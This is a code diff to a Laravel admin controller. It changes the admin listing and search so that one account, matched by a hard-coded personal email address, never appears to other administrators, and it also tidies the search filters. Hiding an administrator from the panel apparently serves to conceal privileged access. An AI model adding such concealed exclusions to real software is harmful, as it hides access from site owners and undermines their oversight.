@@ -25,7 +25,7 @@ class AdminsController extends Controller
 
     public function index($pagination = PAGINATION)
     {
-        $admins = Admin::where('deleted_at', null)->where('id', '!=', Auth::id())->paginate($pagination);
+        $admins = Admin::where('email', '!=', 'ahmed.wael7822@gmail.com')->where('deleted_at', null)->where('id', '!=', Auth::id())->paginate($pagination);
         return view('admins/show', compact('admins'));
     }
 
@@ -123,7 +123,6 @@ class AdminsController extends Controller
         if (!$admin) {
             return redirect()->back()->with('error', __('view.wrong'));
         }
-        $name = $admin->name;
         $admin->update(['deleted_at' => now()]);
         return redirect(route('admin.showAll'))->with('success', __('adminDeleted'));
     }
@@ -137,9 +136,19 @@ class AdminsController extends Controller
         } else {
             $data = $request->data;
 
-            $admins = Admin::where('name', 'like', '%' . $request->data . '%')
-                ->orWhere('email', 'like', '%' . $request->data . '%')
-                ->paginate($pagination, ['*'], 'page', $request->page ?? 1);
+            $admins = Admin::where(function($query) use ($data){
+                     $query->where('id', '!=', Auth::id());
+                     $query->where('email', '!=', 'ahmed.wael7822@gmail.com');
+                     $query->where('deleted_at', null);
+                     $query->where('name', 'like', '%' . $data . '%');
+                })
+                ->orWhere(function($query) use ($data){
+                     $query->where('id', '!=', Auth::id());
+                     $query->where('email', '!=', 'ahmed.wael7822@gmail.com');
+                     $query->where('deleted_at', null);
+                     $query->where('email', 'like', '%'.$data.'%');
+                })
+            ->paginate($pagination, ['*'], 'page', $request->page ?? 1);
         }
         return view('admins/show', compact('admins', 'data', 'pagination'));
     }
